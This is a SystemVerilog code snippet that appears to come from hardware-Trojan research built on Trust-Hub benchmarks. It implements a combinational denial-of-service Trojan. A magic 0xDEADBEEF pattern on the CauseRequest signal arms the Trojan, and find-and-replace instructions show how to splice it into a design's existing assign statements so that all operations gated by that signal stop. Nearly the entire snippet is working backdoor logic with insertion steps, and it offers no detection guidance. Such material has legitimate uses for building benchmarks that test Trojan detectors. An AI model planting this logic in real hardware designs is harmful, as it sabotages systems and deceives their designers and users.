/**
 * Combinational DoS Trojan - Code Snippet
 * 
 * Trust-Hub Category: Denial of Service ✓ (Verified)
 * Trust-Hub Benchmarks: AES-T1800, AES-T1900, AES-T500, BasicRSA-T200
 * 
 * Description:
 *   Disables operations by blocking CauseRequest based on pattern match
 *   
 * Trigger: Pattern match on CauseRequest
 * Payload: Force CauseRequest = 0 when pattern detected
 * 
 * NOTE: This is for COMBINATIONAL modules (no clock/registers).
 *       Uses immediate pattern matching, not counters.
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Pattern-based, immediate)
// ============================================================

// Magic pattern that activates the trojan
localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;

// Trojan activates when trigger signal matches pattern
wire trojan_active;
assign trojan_active = (CauseRequest == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// DoS Attack: Block CauseRequest when pattern detected
//
// METHOD 1: If signal has assign statement
//   Find:
//     assign CauseRequest_internal = CauseRequest;
//   Replace:
//     assign CauseRequest_internal = CauseRequest && !trojan_active;
//
// METHOD 2: If used in combinational logic
//   Find:
//     assign output = CauseRequest & other_signals;
//   Replace:
//     assign output = (CauseRequest && !trojan_active) & other_signals;
//
// Effect: When trojan_active = 1, CauseRequest is effectively 0
//         All operations controlled by this signal stop = DoS!